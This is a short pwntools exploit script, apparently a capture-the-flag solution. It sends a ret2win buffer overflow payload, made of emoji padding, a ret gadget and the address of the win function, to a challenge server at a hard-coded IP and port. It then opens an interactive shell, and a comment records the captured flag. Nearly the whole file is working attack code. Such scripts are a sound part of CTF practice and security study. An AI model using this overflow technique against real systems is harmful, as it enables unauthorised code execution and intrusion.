from pwn import *


elf = context.binary = ELF("./chall")
# p = process()
p = remote("34.45.81.67",16002)

# gdb.attach(p)

rop = ROP(elf)
p.sendline(b"\x00" + "😃".encode() * 69 +  cyclic(3)  + p64(rop.ret.address)+ p64(elf.sym.win))

p.interactive()

# L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}